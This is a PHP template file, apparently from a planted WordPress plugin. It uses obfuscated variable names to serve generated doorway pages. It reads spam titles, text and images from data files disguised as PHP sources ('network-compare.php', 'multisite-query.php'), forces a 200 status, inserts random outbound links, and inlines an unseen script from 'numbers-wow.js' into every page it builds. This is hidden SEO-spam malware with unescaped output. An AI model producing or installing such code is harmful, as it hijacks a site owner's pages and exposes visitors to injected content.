<?php
$bOLVdiVJME = intval(get_query_var('nwnzdrdeq'));

if ($bOLVdiVJME < 1 || $bOLVdiVJME > 3324) return;
$cWkmyOZtei = file(plugin_dir_path(__FILE__).'network-compare.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$oJOl9mLyd = explode(';', $cWkmyOZtei[$bOLVdiVJME]);
if (count($oJOl9mLyd) < 2) return;
$gIdPXkceRC = $oJOl9mLyd[0];
$cOZtH4Y  = $oJOl9mLyd[1];
$n8qaj6w = $oJOl9mLyd[2];
$xDs0q7MgCx  = $oJOl9mLyd[3];
$ry8QI9 = $oJOl9mLyd[4];
set_query_var('gykpeth', $gIdPXkceRC);

$bNvm1TX = '';
$wDXQld = plugin_dir_path(__FILE__).'multisite-query.php';
if (is_file($wDXQld)) {
	$dYVxbkmgt = file($wDXQld, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($dYVxbkmgt);
	shuffle($dYVxbkmgt);
	$hra2OHNLB = mt_rand(2, 5);
	if (count($dYVxbkmgt) > $hra2OHNLB) {
		for ($xuqfsnZIL = 0; $xuqfsnZIL < $hra2OHNLB; $xuqfsnZIL++) {
			$ks9G92 = array_shift($dYVxbkmgt);
			$bNvm1TX .= '<p><a href="'.$ks9G92.'">'.$ks9G92.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $gIdPXkceRC; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $cOZtH4Y . "</p>\n";
				if (strlen($xDs0q7MgCx) > 0) echo "<p>" . $xDs0q7MgCx . "</p>\n";
				if (strlen($n8qaj6w) > 0) echo "<p>" . $n8qaj6w . "</p>\n";
				if (strlen($ry8QI9) > 0) echo '<p><a href="#"><img src="'.$ry8QI9.'"></a>' . "</p>\n";
				echo $bNvm1TX;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$a6vsRGz = plugin_dir_path(__FILE__) . 'numbers-wow.js';
if (is_file($a6vsRGz)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($a6vsRGz);
	echo '</script>';
}
get_footer();
?>
